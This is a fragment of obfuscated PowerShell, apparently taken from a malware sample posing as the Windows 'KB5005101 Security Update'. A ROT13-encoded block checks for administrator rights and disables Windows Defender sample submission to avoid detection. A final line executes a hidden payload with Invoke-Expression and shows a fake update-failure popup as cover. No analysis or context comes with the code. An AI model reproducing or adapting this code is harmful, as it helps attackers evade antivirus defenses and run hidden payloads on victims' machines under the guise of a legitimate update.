...
Vs((Trg-ZcCersrerapr).FhozvgFnzcyrfPbafrag -ar 0)
{
   `$obby = (([Flfgrz.Frphevgl.Cevapvcny.JvaqbjfVqragvgl]::TrgPheerag()).tebhcf -zngpu `"F-1-5-32-544`")
   Vs(`$obby){Frg-ZcCersrerapr -FhozvgFnzcyrfPbafrag 0}
}
...
try{echo "$rdata"|Invoke-Expression}catch{powershell (New-Object -ComObject Wscript.Shell).Popup("Fail to execute KB5005101.exe Update Package",5,"                           KB5005101 Security Update",0+16)}
